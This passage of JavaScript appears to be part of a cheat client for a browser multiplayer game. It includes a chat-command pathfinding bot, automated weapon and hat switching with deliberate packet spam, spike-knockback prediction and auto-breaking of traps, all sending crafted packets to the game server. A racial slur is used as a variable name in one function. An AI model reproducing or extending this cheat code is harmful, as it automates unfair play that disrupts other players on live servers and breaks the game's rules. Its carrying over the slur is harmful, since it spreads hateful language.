                y: null,
            },
            quick: {
                x: null,
                y: null,
            },
        }
    }
    setWaypoint(name, pos){
        if(pos.x && pos.y){
            this.waypoints[name] = {
                x: pos.x,
                y: pos.y,
            }
        }
    }
    drawWaypointMap(mapCtx, canvas){
        mapCtx.font = "0px Hammersmith One";
        mapCtx.textBaseline = "middle";
        mapCtx.textAlign = "center";
        for(let tag in this.waypoints){
            if(tag == "death"){
                mapCtx.fillStyle = "#E44";
            }else if(tag == "quick"){
                mapCtx.fillStyle = "#44E";
            }else{
                mapCtx.fillStyle = "#fff";
            }
            if(this.waypoints[tag].x && this.waypoints[tag].y){
                mapCtx.fillText("x", this.waypoints[tag].x / 14400 * canvas.width, this.waypoints[tag].y / 14400 * canvas.height);
            }
        }
        mapCtx.strokeStyle = "#4E4";
        if(this.goal.type == "xpos"){
            mapCtx.beginPath();
            mapCtx.moveTo(this.goal.pos.x / 14400 * canvas.width, 0);
            mapCtx.lineTo(this.goal.pos.x / 14400 * canvas.width, canvas.height);
            mapCtx.stroke();
        }else if(this.goal.type == "ypos"){
            mapCtx.beginPath();
            mapCtx.moveTo(0, this.goal.pos.y / 14400 * canvas.height);
            mapCtx.lineTo(canvas.width, this.goal.pos.y / 14400 * canvas.height);
            mapCtx.stroke();
        }else if(this.goal.pos.x && this.goal.pos.y){
            mapCtx.fillStyle = "#4E4";
            mapCtx.fillText("x", this.goal.pos.x / 14400 * canvas.width, this.goal.pos.y / 14400 * canvas.height);
            // console.log(this.goal.pos.x/14400*canvas.width,canvas.width)
        }
    }
    drawWaypoints(ctx, theta){
        //waypoints
        for(let tag in this.waypoints){
            if(tag == "death"){
                ctx.strokeStyle = "#E44";
            }else if(tag == "quick"){
                ctx.strokeStyle = "#44E";
            }else{
                ctx.strokeStyle = "#fff";
            }
            if(this.waypoints[tag].x && this.waypoints[tag].y){
                ctx.save();
                ctx.translate(this.waypoints[tag].x, this.waypoints[tag].y);
                ctx.rotate(theta);
                ctx.globalAlpha = 0.6;
                ctx.lineWidth = 8;
                for(let i = 0;i < 4;i++){
                    //spinning thing
                    ctx.rotate(i * Math.PI / 2);
                    ctx.beginPath();
                    ctx.arc(0, 0, 50, 0, Math.PI / 4);
                    ctx.stroke();
                }
                //pulsing thing
                ctx.lineWidth = 6;
                ctx.globalAlpha = Math.min(0.4, 1 - Math.pow(Math.sin(theta / 2), 2) / 1.2);
                ctx.beginPath();
                ctx.arc(0, 0, 50 + Math.max(0, Math.tan(theta / 2)), 0, PI2);
                ctx.stroke();
                ctx.restore();
            }
        }
        //goal
        ctx.strokeStyle = "#4F4";
        ctx.lineWidth = 10;
        ctx.globalAlpha = 0.8;
        if(this.goal.type == "xpos"){
            ctx.beginPath();
            ctx.moveTo(this.goal.pos.x, 0);
            ctx.lineTo(this.goal.pos.x, 14400);
            ctx.stroke();
        }else if(this.goal.type == "ypos"){
            ctx.beginPath();
            ctx.moveTo(0, this.goal.pos.y);
            ctx.lineTo(14400, this.goal.pos.y);
            ctx.stroke();
        }else if(this.goal.pos.x && this.goal.pos.y){
            ctx.save();
            ctx.translate(this.goal.pos.x, this.goal.pos.y);
            ctx.beginPath();
            ctx.arc(0, 0, 10, 0, PI2)
            ctx.stroke();
            ctx.beginPath();
            ctx.rotate(theta / 3);
            let r = Math.cos(theta) * 10;
            for(let i = 0;i < 3;i++){
                ctx.rotate(PI2 / 3);
                ctx.moveTo(60 + r, 0);
                ctx.lineTo(120 + r, -20);
                ctx.lineTo(100 + r, 0);
                ctx.lineTo(120 + r, 20);
                ctx.closePath();
            }
            ctx.stroke();
            ctx.restore();
        }
    }
    setSelf(self){
        this.self = self;
    }
    setSend(sender){
        this.send = sender;
    }
    //ideas: https://github.com/cabaletta/baritone/blob/master/USAGE.md
    /**Current Commands
	 * path
	 * stop
	 * goal
	 * <goal/goto> x [Number: x position]
	 * <goal/goto> y [Number: y position]
	 * <goal/goto> [x: Number] [y: Number]
	 * waypoint set [name: String]
	 * waypoint del [name: String]
	 * waypoint goto [name: String]
	 * follow player <[ID/Name: Any]/all(default)>
	 * follow animal <[ID/Name: Any]/all(default)>
     * wander
	 **Planned Commands
	 * multigoal [wp1: String] ...
	 * find [id: Number]
	 * find [name: String] [owner(optional): Number]
	*/
    abort(){
        this.goal.pathing = false;
    }
    updateChat(txt, ownerID){
        //handle commands here
        if(ownerID != this.self.sid){
            return;
        }

        let args = txt.trimEnd().split(" ");

        if(args[0] == "path"){
            //start pathfinding(assuming there is a goal)
            if(this.goal.type){
                this.goal.pathing = true;
                this.pathfinder.clearPath();
            }
        }else if(args[0] == "stop"){
            if(this.goal.pathing){
                this.goal.pathing = false;
                this.pathfinder.clearPath();
                knla.send("9", null, "client");
            }
        }else if(args[0] == "goal" || args[0] == "goto"){
            //goal sets goal
            //goto sets a path and starts walking towards it
            if(isNaN(parseInt(args[1]))){
                if(args[1] == "x"){
                    //get to a x position
                    //<goal/goto> x [Number: x position]
                    let pos = parseInt(args[2]);
                    if(pos >= 0 && pos <= 14400){
                        this.goal.pathing = args[0] == "goto";
                        this.goal.type = "xpos";
                        this.goal.pos.x = pos;
                    }
                }else if(args[1] == "y"){
                    //get to a y position
                    //<goal/goto> y [Number: y position]
                    let pos = parseInt(args[2]);
                    if(pos >= 0 && pos <= 14400){
                        this.goal.pathing = args[0] == "goto";
                        this.goal.type = "ypos";
                        this.goal.pos.y = pos;
                    }
                }else if(args[0] == "goal" && !args[1]){
                    this.goal.type = "pos";
                    this.goal.pos.x = this.self.x;
                    this.goal.pos.y = this.self.y;
                }
            }else{
                //get to a x and y position
                //<goal/goto> [x: Number] [y: Number]
                let xPos = parseInt(args[1]);
                let yPos = parseInt(args[2]);
                if(xPos >= 0 && xPos <= 14400 && yPos >= 0 && yPos <= 14400){
                    this.goal.pathing = args[0] == "goto";
                    this.goal.type = "pos";
                    this.goal.pos.x = xPos;
                    this.goal.pos.y = yPos;
                }
            }
        }else if(args[0] == "thisway" || args[0] == "project"){
            //project my position x distance from my position
            //thisway [distance: Number] [angle(optional): Number]
            let amt = parseInt(args[1]);
            let dir = parseFloat(args[2]) || this.self.dir;
            if(!isNaN(amt) && this.self.x && this.self.y && this.self.dir){
                this.goal.type = "pos";
                this.goal.pos.x = Math.max(0, Math.min(14400, this.self.x + Math.cos(dir) * amt));
                this.goal.pos.y = Math.max(0, Math.min(14400, this.self.y + Math.sin(dir) * amt));
            }
        }else if(args[0] == "follow" || args[0] == "flw"){
            if(args[1] == "player" || args[1] == "ply"){
                //follow player <[ID: Number]/all(default)>
                this.goal.pathing = true;
                this.goal.type = "player";
                if(args[2]){
                    this.goal.entity = args.slice(2).join(" ");
                }else{
                    this.goal.entity = -1;
                }
            }else if(args[1] == "team"){
                //follow team
                this.goal.pathing = true;
                this.goal.type = "team";
            }else if(args[1] == "animal"){
                this.goal.pathing = true;
                this.goal.type = "animal";
                if(args[2]){
                    this.goal.entity = args[2];
                }else{
                    this.goal.entity = -1;
                }
            }
        }else if(args[0] == "find" || args[0] == "fnd"){
            //finds a object: natural or placed
            //find [id: Number]
            //find [name: String] [owner(optional): Number]
        }else if(args[0] == "waypoint" || args[0] == "wp"){
            if(args[1] == "set"){
                //waypoint set [name: String]
                if(Boolean(args[2]) && !this.waypoints[args[2]]){
                    this.waypoints[args[2]] = {
                        x: this.self.x,
                        y: this.self.y,
                    }
                }
            }else if(args[1] == "del"){
                //waypoint del [name: String]
                delete this.waypoints[args[2]];
            }else if(args[1] == "goto"){
                //waypoint goto [name: String]
                if(this.waypoints[args[2]]?.x && this.waypoints[args[2]]?.y){
                    this.goal.pathing = true;
                    this.goal.type = "pos";
                    this.goal.pos.x = this.waypoints[args[2]].x;
                    this.goal.pos.y = this.waypoints[args[2]].y;
                }
            }
        }else if(args[0] == "wander" || args[0] == "wnd"){
            this.goal.pathing = true;
            this.goal.type = "wander";
            this.goal.pos.x = Math.random() * 14400;
            this.goal.pos.y = Math.random() * 14400;
        }
    }
    //determines if we are nearing goal
    reachedGoal(){

        //    const lastPoint = this.pathfinder.prevPath[this.pathfinder.prevPath.length - 1];
        // console.log( Math.hypot(lastPoint.x - this.goal.pos.x, lastPoint.y - this.goal.pos.y) === 0)
        if(this.goal.type == "xpos"){
            return Math.abs(this.self.x - this.goal.pos.x) < this.pathfinder.estimatedSpeed;
        }else if(this.goal.type == "ypos"){
            return Math.abs(this.self.y - this.goal.pos.y) < this.pathfinder.estimatedSpeed;
        }else if(this.goal.type == "pos" || this.goal.type == "wander"){
            return Math.hypot(this.self.x - this.goal.pos.x, this.self.y - this.goal.pos.y) < this.pathfinder.estimatedSpeed;
        }
    }
    async updatePlayers(players){
        console.log(testeroo == E.skinIndex)
        ticks++;
        if(this.goal.pathing){
            let finalGoal;
            if(this.goal.type == "xpos"){
                //go towards x position
                finalGoal = [];
                for(let i = -this.pathfinder.size; i <= this.pathfinder.size; i++){
                    finalGoal.push({
                        x: this.goal.pos.x,
                        y: this.self.y + i * this.pathfinder.res,
                    })
                }
            }else if(this.goal.type == "ypos"){
                //go towards y position
                finalGoal = [];
                for(let i = -this.pathfinder.size; i <= this.pathfinder.size;i += 3){
                    finalGoal.push({
                        x: this.self.x + i * this.pathfinder.res,
                        y: this.goal.pos.y,
                    })
                }
            }else if(this.goal.type == "pos" || this.goal.type == "wander"){
                //simple go towards position
                finalGoal = {
                    x: this.goal.pos.x,
                    y: this.goal.pos.y,
                };
            }else if(this.goal.type == "player"){
                //do pathfinding for following player
                if(this.goal.entity === -1){
                    finalGoal = [];
                    for(let player of players){
                        if(player.visible && player.sid != this.self.sid){
                            finalGoal.push(player)
                        }
                    }
                    if(!finalGoal.length){
                        finalGoal = null;
                    }
                }else{
                    for(let player of players){
                        if(player.visible && player.sid != this.self.sid && (player.sid == this.goal.entity || player.name == this.goal.entity)){
                            finalGoal = player;
                            break;
                        }
                    }
                }
            }else if(this.goal.type == "team"){
                //follow teammates
                finalGoal = [];
                for(let player of players){
                    if(player.team == this.self.team && player.sid != this.self.sid){
                        finalGoal.push(player)
                    }
                }
                if(!finalGoal.length || !this.self.team){
                    finalGoal = null;
                }
            }
            if(finalGoal && ! pushing){
                if(this.reachedGoal()){
                    if(this.goal.type == "wander"){
                        this.goal.pos.x = Math.random() * 14400;
                        this.goal.pos.y = Math.random() * 14400;
                    }else{
                        this.goal.pathing = false;
                    }
                    this.pathfinder.clearPath();
                    knla.send("9", undefined,"pathfinder");
                }else{
                    let path = await Pathfinder.pathTo(finalGoal);
                    if(path){
                        knla.send("9", path.ang,"pathfinder");
                    }else{
                        knla.send("9", undefined,"pathfinder");
                    }
                }
            }
            this.finalGoal = finalGoal
        }
    }
    async updateAnimals(animals){
        if(this.goal.type == "animal" && this.goal.pathing){
            let finalGoal;
            if(this.goal.entity === -1){
                finalGoal = [];
                for(let animal of animals){
                    if(animal.visible && animal.sid != this.self.sid){
                        finalGoal.push(animal)
                    }
                }
                if(!finalGoal.length){
                    finalGoal = null;
                }
            }else{
                for(let animal of animals){
                    if(animal.visible && (animal.sid == this.goal.entity || animal.name == this.goal.entity)){
                        finalGoal = animal;
                        break;
                    }
                }
            }
            if(this.reachedGoal()){
                this.pathfinder.clearPath();
                this.goal.pathing = false;
                knla.send("9", undefined, "client");
            }else if(finalGoal){
                let path = await this.pathfinder.pathTo(finalGoal);
                if(path){
                    knla.send("9", path.ang,"pathfinder");
                }else{
                    knla.send("9", undefined,"pathfinder");
                }
            }
            this.finalGoal = finalGoal
        }
    }
    async addBuilding(obj){
        await new Promise((resolve) => {
            let id = setInterval(() => {
                if(!this.pathfinder.resolve){
                    resolve();
                    clearInterval(id);
                }
            })
            })
        let path = this.pathfinder.getPath();
        let dist = path?.dist + this.pathfinder.estimatedSpeed / this.pathfinder.res + 3;
        dist = Math.min(this.pathfinder.prevPath.length - 1, Math.trunc(dist));
        if(dist&&!pushing){
            for(let i = dist; i >= 0; i--){
                let point = this.pathfinder.prevPath[i];
                if(Math.hypot(point.x - obj.x, point.y - obj.y) < obj.pathScale){
                    this.pathfinder.prevPath = this.pathfinder.prevPath.slice(i);
                    let ez = await this.pathfinder.pathTo(this.finalGoal,true)
                    ez&&knla.send("9",ez.ang,"pathfinder")
                    break;
                }
            }
        }
    }
}

Tach = new Tachyon(Pathfinder);



function hslToRgb(h, s, l) {
    let r, g, b;

    if (s === 0) {
        r = g = b = l; // achromatic
    } else {
        const hue2rgb = function hue2rgb(p, q, t) {
            if (t < 0) t += 1;
            if (t > 1) t -= 1;
            if (t < 1 / 6) return p + (q - p) * 6 * t;
            if (t < 1 / 2) return q;
            if (t < 2 / 3) return p + (q - p) * (2 / 3 - t) * 6;
            return p;
        };

        const q = l < 0.5 ? l * (1 + s) : l + s - l * s;
        const p = 2 * l - q;
        r = hue2rgb(p, q, h + 1 / 3);
        g = hue2rgb(p, q, h);
        b = hue2rgb(p, q, h - 1 / 3);
    }

    return [round(r * 255), round(g * 255), round(b * 255)];
}


async function antiOneTicks(){
    if(antiOneTick) {
        Hg(6,11);
        await nextTick()
        await nextTick()
        await nextTick()
        antiOneTick = false
    }
}










function fastwep(XD,wep){
    // packet spam is going here thats why, because we don't have secondary just yet
    if(oneTickToggle) return
    if(meleesyncing) {
        knla.send("z", primary, true)
        return;
    }
    wep = (R.weapons[primary]?.spdMult >= R.weapons[secondary]?.spdMult) || secondary == null ? wep = primary : wep = secondary
    //wep = R.weapons[primary]?.spdMult >= R.weapons[secondary]?.spdMult ? wep = primary : wep = secondary
    //console.log(wep);
    if(XD && E.buildIndex !=-1) return wep
    if(wr_obj || breaking || oneTick || hold || clairo2|| E.pr!=1 || E.sr !=1||E.hitting||bowinstaing||autohit||E.buildIndex!=-1) return;
    if(E.weaponIndex!= wep) knla.send("z", wep, true)
    if(XD) return wep;
}
function bestLoadout() {
    return bTw(E,0, {
        buildIndex: -1,
        weaponIndex: E.weaponIndex,
        skinIndex: E.skinIndex,
        tailIndex: E.tailIndex,
        y2: E.y2,
        zIndex: null
    })
}
allWeapons = R.weapons
var xdIncrement = .2;
var RADIUS = 300;
let XDD = 0;
const decayRate = pow(0.993, 111);
const threshold = .5//.45;//.5;
function getDecelDist(x,t){
    if(isNaN(x)||x==Infinity) return null;
    let value = x;

    while (value >= .5) {
        value = value * decayRate;
        x += value;
    }
    return x
}











function doLoadout(wep,skinIndex,tailIndex,buildIndex){
    return {
        buildIndex: !buildIndex ? -1 : buildIndex,
        weaponIndex: wep,
        skinIndex: skinIndex,
        tailIndex: tailIndex,
        y: E.y2,
        zIndex: null
    }
}
// Set up initial variables
const spinDuration = 1000; // Duration of the spin effect in milliseconds
const initialSpinSpeed = Math.PI; // Initial spin speed in radians per millisecond
const spinAcceleration = (2 * Math.PI) / spinDuration; // Spin acceleration rate
function renderFake(e){

    function isMaxExpire(newExpire, existingExpire) {
        return typeof newExpire === 'number' && (newExpire > existingExpire || existingExpire === undefined);
    }
    const sidMap = new Map();

    WC.forEach(player => {
        if (player.sid) {
            const existingPlayer = sidMap.get(player.sid);

            // Check if the current player has a higher expire value or if there is no existing player for the sid
            if (!existingPlayer || isMaxExpire(player.expire, existingPlayer.expire)) {
                sidMap.set(player.sid, { ...player });
            }
        }
    });

    WC = Array.from(sidMap.values());
    WC.forEach(XD => {
        if(XD.deathAnim === true){
            let coords = calcPoint(XD.x,XD.y,XD.originDir,XD.dstSpd)
            XD.t1 = void 0 === XD.t2 ? Date.now() : XD.t2;
            XD.t2 = Date.now()
            XD.distance-=XD.dstSpd
            XD.dt = 0
            XD.d1 = XD.d2// += .1
            // XD.d2 +=.3//XD.spinSpd
            // console.log(XD.spinSpd)
            //console.log(XD.decay)
            //  !isNaN(XD.expire) && XD.expire--;
            XD.spinSpd ? (XD.d2+= XD.spinSpd) : (XD.d2 = E.d2)//toRad(40)
            XD.x1 = XD.x
            XD.y1 = XD.y
            XD.x2 = coords.x
            XD.y2 = coords.y
            if(XD.tick === tick+1&&XD.dstSpd === 0){
                // console.log(tick-XD.tick)
            }
        }else if(!isNaN(XD.expire)){
            //  let coords = calcPoint(XD.x,XD.y,XD.originDir,XD.dstSpd)
            XD.t1 = void 0 === XD.t2 ? Date.now() : XD.t2;
            XD.t2 = Date.now()
            XD.distance-=XD.dstSpd
            XD.dt = 0
            XD.d1 = XD.d2
            XD.expire-=1
            XD.x1 = XD.x
            XD.y1 = XD.y
            XD.x2 = XD.NEWX
            XD.y2 = XD.NEWY
        }
    })
    for(let ez = 0; ez < WC.length; ez++){
        e = WC[ez]
        if(!e.deathAnim) continue;
        if(e.distance<=0|| e.tick<tick+1&&e.dstSpd ===0 || e.vals === 0)WC.splice(ez,1);
    }
    WC = WC.filter(x => (x.expire >=0 || x.expire === undefined))
}


var lastVisualTime = 0;

function KB(_, dstSpd, dir) {
    if (!kbVisual || (Date.now() - lastVisualTime) < 730) return;
    var i = { ..._ };
    i.vals = 0.5;
    i.expire = 3;
    i.decay = 0;
    i.distance = dstSpd;
    i.fake = true;
    i.dstSpd = dstSpd;
    i.orginDir = dir;
    WC.push(i);
    lastVisualTime = Date.now();
}
  let alphaForRedStunned = 0;
        let shouldDrawRedStunned = false;
var fisrtloadez = true;
        function drawRedStunned() {
            if (fisrtloadez) {
                M.save();
let mainContext = M;
let player = y;

                let screenWidth = 1920 * 1.3
                let screenHeight = 1080 * 1.3
                let screenW = screenWidth / 2;
                let screenH = screenHeight / 2;
                mainContext.beginPath();
                let gradient = mainContext.createRadialGradient(screenW, screenH, 0, screenW, screenH, screenWidth * 1.4);
                for (let i = 0; i <= 1; i++) {
                    player && player.skinIndex == 45 ? gradient.addColorStop(i, "rgba(86, 86, 86, " + i * alphaForRedStunned + ")") : gradient.addColorStop(i, "rgba(255, 0, 0, " + i * alphaForRedStunned + ")");
                }
                mainContext.fillStyle = gradient;
                mainContext.rect(0, 0, screenWidth, screenHeight);
                mainContext.fill();
                mainContext.restore();
                player && player.shameCount < 5 && (alphaForRedStunned -= 0.01);
            }
        }
function cAnim(_, dstSpd, spinSpd, skin, tail, decay, xtick, predict) {
    var i = { ..._ };
   i.skinColor;
    i.skinIndex = 48;
    i.tailIndex = 13;
    i.vals = 1;
    i.deathAnim = true;
    i.spinSpd = spinSpd || 0;
    i.decay = decay || 0;
    i.distance = 3000;
    i.fake = true;
    i.dstSpd = dstSpd;
    i.tick = tick + xtick + 1;
    i.positions = predict;
    i.originDir = _.sid === E.sid ? Math.random() * Math.PI * 2 : getAimer(E, _);
    i.orbitRadius = 10;
    i.orbitAngle = 0;
    i.rotation = 0;

    WC.push(i);
}
function updatePlayers2() {
    for (var i = 0; i < WC.length; i++) {
        var c = WC[i];
        if (c.deathAnim) {
            c.rotation += c.spinSpd;

            if (c.rotation > Math.PI * 2) {
                c.rotation -= Math.PI * 2;
            }
        }
    }
}
setInterval(updatePlayers2, 16);

function cPI(player, x, y, skin, tail, wep){
    var info = {...player}
    //   info.sid = 10000
    info.x1 = x
    info.y1 = y
    info.x2 = x
    info.y2 = y
    info.showSID = true;
    info.skinIndex = skin || 0
    info.tailIndex = tail || 0
    info.weaponIndex = wep || 0
    console.log(info)
    return info
}

function FP(player, purpose, move, spin){
    var i = {...player}
    i.purpose = purpose
    i.moving = move
    i.spinning = spin
    WC.push(i)
}


/*function kbSpikes(target,angle, dist,z,x,y) {
    let current = {x: Infinity, y: Infinity, fake: true}
    // z=renderObjects.concat(W,Y)
    z = nearObjects.filter(e => e?.group?.name == 'spikes'&& (clan(e?.owner?.sid)||target?.team === null&&e?.owner?.sid!=target.sid))
    for(let i in z) {
        let obj = z[i];
        //   if(!obj.ignoreCollision) {
        let dist1 = getDistance(target.x2, target.y2, obj.x, obj.y);

        let point1 = calcPoint(target.x2, target.y2, angle, dist1);

        let dist2 = getDistance(point1.x, point1.y, obj.x, obj.y);

        if(dist2 < obj.scale && dist1 - obj.scale-35 < dist) {
            let p = calcPoint(x, y, angle, dist1 - obj.scale-35);
            if(getDistance(current.x, current.y, target.x2, target.y2) > getDistance(p.x, p.y, target.x2, target.y2)) {
                current = p;
                //    console.log('can do')
            }
        }
        //}
    }
    if(current.fake) {
        return false;
    } else {
        return current;
    }
}*/
function onion(target, angle, distance, vel,insta, z, x, y, scale) {
    let current = {x: Infinity, y: Infinity, fake: true}
    z = nearObjects.filter(e => e?.group?.name == 'spikes'&& (target.sid != E.sid ? (clan(e?.owner?.sid)||target?.team === null&&e?.owner?.sid!=target.sid): !clan(e?.owner?.sid))||(e?.type == 1 && e.y >= 12000))
    if(!z) return false
    if(vel){
        x = target.np.real.x
        y = target.np.real.y
    } else{
        x = target.x2
        y = target.y2;
    }
    for(let i in z) {
        let obj = z[i];
        scale = obj.type === 1 ? scale = obj.scale*.55 +35: obj.scale +35
        let dist1 = dist(target,obj)//getDistance(nearestenemy.x2, nearestenemy.y2, obj.x, obj.y);
        let point1 = calcPoint(x, y, angle, dist1);
        let dist2 = dist(point1,obj)//getDistance(point1.x, point1.y, obj.x, obj.y);
        if(dist2 < (scale) && dist1 - (scale) < distance&&(insta&&obj.dmg>=35||obj.type===1||!insta)) {
            let p00 = calcPoint(x, y, angle, dist1 - (scale));
            return {x:p00.x, y: p00.y, obj: obj};
        }
    }
    return false;
}
function onionretrap(target, angle, distance, vel,insta, z, x, y, scale) {
    let current = {x: Infinity, y: Infinity, fake: true}
    z = nearObjects.filter(e => e.name == 'pit trap'&& (target.sid != E.sid ? (clan(e?.owner?.sid)||target?.team === null&&e?.owner?.sid!=target.sid): !clan(e?.owner?.sid)))
    if(!z) return false
    if(vel){
        x = target.np.real.x
        y = target.np.real.y
    } else{
        x = target.x2
        y = target.y2;
    }
    for(let i in z) {
        let obj = z[i];
        scale = obj.scale + 35//obj.type === 1 ? scale = obj.scale*.55 +35: obj.scale +35
        let dist1 = dist(target,obj)//getDistance(nearestenemy.x2, nearestenemy.y2, obj.x, obj.y);
        let point1 = calcPoint(x, y, angle, dist1);
        let dist2 = dist(point1,obj)//getDistance(point1.x, point1.y, obj.x, obj.y);
        if(dist2 < (scale) && dist1 - (scale) < distance) {
            let p00 = calcPoint(x, y, angle, dist1 - (scale));
            return {x:p00.x, y: p00.y, obj: obj};
        }
    }
    return false;
}
let moveTicks = 0;
let didStop = {time:Date.now(),type:null}//Date.now();;
var stopHit = 0;
function runInto(player, angle, vel,MAX, z, scale) {
    // console.log('ez')
    if(!amAlive) return;
    z = nearObjects.filter(e => e?.group?.name == 'spikes' && (!clan(e?.owner?.sid)) || (e?.type == 1 && e.y >= 12000)||e.name == "teleporter").sort((a,b)=>fastHypot(player.x2-a.x,player.y2-a.y)-fastHypot(player.x2-b.x,player.y2-a.y));
    if (!z.length) return false;
    for (let i = 0, obj; i < z.length; i++) {
        scale = (obj = z[i]).type === 1 ? obj.scale * 0.6 + 35: obj.teleport ? obj.scale * .75 + 35 : obj.scale + 35;
        let decelVels = [getDecelDist(vel.vel), getDecelDist(player.movSpd)];
        let closestPoints = [calcPoint(player.x2, player.y2, angle, decelVels[0]), calcPoint(player.x2, player.y2, angle, decelVels[1])];
        let isIntersecting = (dist(closestPoints[0], obj) <= scale || dist(closestPoints[1], obj) <= scale);
        isNaN(MAX) === true && (MAX = 0);
        let ranger = secondary === 10 ? 75 : R.weapons[primary].range;
        let dists = [dist(player,obj,"object")<=ranger, dist(player.np.decel,obj,"object")<=ranger]
        let canBreak = (dists[0] || dists[1]) && isIntersecting && obj.type !== 1;
        let conditions = (isIntersecting || ((dists[0] || dists[1]) && isIntersecting && obj.type !== 1));
        if (conditions) {
            let aimer;
            if(canBreak){
                aimer = bestAim(obj,secondary===10?75:R.weapons[primary].range,z);
            }
            if(!keys.ShiftLeft){
                knla.send("9", undefined);
                if(Date.now()-didStop.time >= 250 && didStop.type == "static" || didStop.type != 'static')
                if(canBreak&&(secondary===10&&player.sr===1||player.pr===1&&secondary!=10&&primary!=8)){
                    hold = secondary===10?10:primary
                    breaker = true;
                    stopHit = tick;
                    aim[0] = aimer;
                    breakBuild(aimer, secondary === 10 ? secondary : primary, secondary === 10 ? E.secondaryVar : E.primaryVar, bH.includes(40) && !E.dmgpot.soldier ? 40 : 6, 1);
                    visAim = true;
                    if(lastHat!=40)Hg(E.dmgpot.soldier ? 6 : 40 ,11);
                    nHat = E.dmgpot.soldier ? 6 : 40;
                }
            } else if(Date.now()-didStop.time >= 250 && didStop.type == 'override' || didStop.type != 'override')
            return obj;
        }
    }
    return false;
}




function lineIntersectsCircle(lineStart, lineEnd, circleCenter, circleRadius) {
    const dx = lineEnd[0] - lineStart[0];
    const dy = lineEnd[1] - lineStart[1];
    const lineLengthSquared = dx * dx + dy * dy;

    if (lineLengthSquared === 0) {
        // Line is just a point, check if it's inside the circle
        const distanceSquared = (lineStart[0] - circleCenter[0]) ** 2 + (lineStart[1] - circleCenter[1]) ** 2;
        return distanceSquared <= circleRadius ** 2;
    }

    const t = max(0, min(1, ((circleCenter[0] - lineStart[0]) * dx + (circleCenter[1] - lineStart[1]) * dy) / lineLengthSquared));

    const projectionX = lineStart[0] + t * dx;
    const projectionY = lineStart[1] + t * dy;

    const distanceSquared = (projectionX - circleCenter[0]) ** 2 + (projectionY - circleCenter[1]) ** 2;

    return distanceSquared <= circleRadius ** 2;
}




function ez(player, angle, z, scale) {
    if(player.inTrap) return;
    z = player.builds.filter(e =>(e?.group?.name == 'spikes' && !player.teamer(e?.owner?.sid))||e.name == "teleporter").sort((a,b)=>fastHypot(player.x2-a.x,player.y2-a.y)-fastHypot(player.x2-b.x,player.y2-a.y));
    player.np = bTw(player,angle,player,1);
    if (!z.length) return false;
    for (let i = 0; i < z.length; i++) {
        let obj = z[i];
        scale = obj.type === 1 ? obj.scale * 0.6: obj.teleport ? obj.scale * .8 : obj.scale;
        scale += 35
        let decelVel = getDecelDist(player.np.vel);
        let closestPoint = calcPoint(player.x2, player.y2, angle, min(scale, decelVel));
        let isIntersecting = dist(closestPoint, obj) <= scale;
        let ranger = player.weapons[1] === 10 ? R.weapons[10].range: R.weapons[player.weapons[0]].range
        let canBreak =  (isIntersecting||(player.tick-player.stopHit<=3&&(dist(player,obj,"object")<=ranger||dist(player.np.decel,obj,"object")<=ranger)&&obj.type!==1&&player.skinIndex===40)) ? true : false
        if(canBreak){
            player.emit('9', null)
            player.break(obj)
            player.stopHit = player.tick
        }
        if(isIntersecting)return {obj:obj, break:canBreak};
    }
    return false;
}



















function runInto3(wes2025niggas,virtualPos,_){
    let hatSpeed = (function(e){for(let i=0;i<Xt.length;i++)if(e==Xt[i].id){return Xt[i].spdMult}})(lastHat) || 1;
    let accSpeed = (function(e){for(let i=0;i<Gt.length;i++)if(e==Gt[i].id){return Gt[i].spdMult}})(lastTail) || 1;
    let wepSpeed = R.weapons[E.weapons[E.weaponIndex] || E.weapons[0]].spdMult || 1;
    mySpeed = DefaultSpeed * wepSpeed * hatSpeed * accSpeed * (E.y2 < T.snowBiomeTop && lastHat != 15 ? T.snowSpeed : 1);
    if(moveDirection !== undefined){
        virtualPos = {x2:E.x2 + mySpeed * cos(moveDirection) + (E.x2 - E.x1) / 100, y2:E.y2 + mySpeed * sin(moveDirection) + (E.y2 - E.y1) / 100}
        for(let i = 0;i < nearObjects.length;i++){
            _ = nearObjects[i];
            if(dist(R,_) > mySpeed + 100){
                break;
            }
            if(_?.group?.name == "spikes" && !clan(_.owner.sid)||_.type === 1 &&_.y >= 12000){
                let d = objDist(_, virtualPos);
                if(objDist(_, virtualPos) < _.scale + 40){
                    wes2025niggas = null;
                    knla.send('9',wes2025niggas)
                    return true;
                    break;
                }
            }
        }
    }
    if(moveDirection === undefined){
        virtualPos = {x2:E.x2 + mySpeed * cos(moveDirection) + (E.x2 - E.x1) / 90, y2:E.y2 + mySpeed * sin(moveDirection) + (E.y2 - E.y1) / 90}
        for(let i = 0;i < nearObjects.length;i++){
            _ = nearObjects[i];
            if(dist(R,_) > mySpeed + 100){
                break;
            }
            if(_?.group?.name == "spikes" && !clan(_.owner.sid)||_.type === 1 &&_.y >= 12000){
                let d = objDist(_, virtualPos);
                if(objDist(_, virtualPos) < _.scale + 40){
                    if(objDist(nearestenemy, E) > R.weapons[E.weapons[E.weapons[1] == 10 ? 1 : 0]].range + 200 && E.skins[40]){
                        let tempSpeed = mySpeed * 0.3 / hatSpeed;
                        virtualPos = {x2:E.x2 + tempSpeed * cos(moveDirection) + (E.x2 - E.x1) / 90, y2:E.y2 + tempSpeed * sin(moveDirection) + (E.y2 - E.y1) / 90}
                        if(objDist(_, virtualPos) > _.scale + 60){
                        }else{
                            wes2025niggas = null;
                            knla.send('9',wes2025niggas)
                            return true;
                        }
                    }else{
                        wes2025niggas = null;
                        knla.send('9',wes2025niggas)
                        return true;
                    }
                    break;
                }
            }
        }
    }
    return false
}




function projPath(x, y, angle, dist,z) {
    let current = {x: Infinity, y: Infinity, fake: true}
    z=renderObjects.concat(J,ye)
    for(let i in z) {
        let obj = z[i];
        if(!obj.ignoreCollision) {
            let dist1 = getDistance(x, y, obj.x, obj.y);

            let point1 = calcPoint(x, y, angle, dist1);

            let dist2 = getDistance(point1.x, point1.y, obj.x, obj.y);

            if(dist2 < obj.scale && dist1 - obj.scale < dist) {
                let p = calcPoint(x, y, angle, dist1 - obj.scale);
                if(getDistance(current.x, current.y, E.x, E.y) > getDistance(p.x, p.y, E.x, E.y)) {
                    current = p;
                }
            }
        }
    }
    if(current.fake) {
        return false;
    } else {
        return current;
    }
}

function calcPoint(x, y, angle, dist) {
    if(angle==undefined) {return {x:E.x,y:E.y}} else{
        x = x + dist * cos(angle);
        y = y + dist * sin(angle);
        return {x: x, y: y};
    }
}
function projCollision(x, y , angle, dist){
    let p3 = dist(E,{x:x,y:y});
    let p = calcPoint(x, y, angle, dist);
    let p2 = dist(E,p)
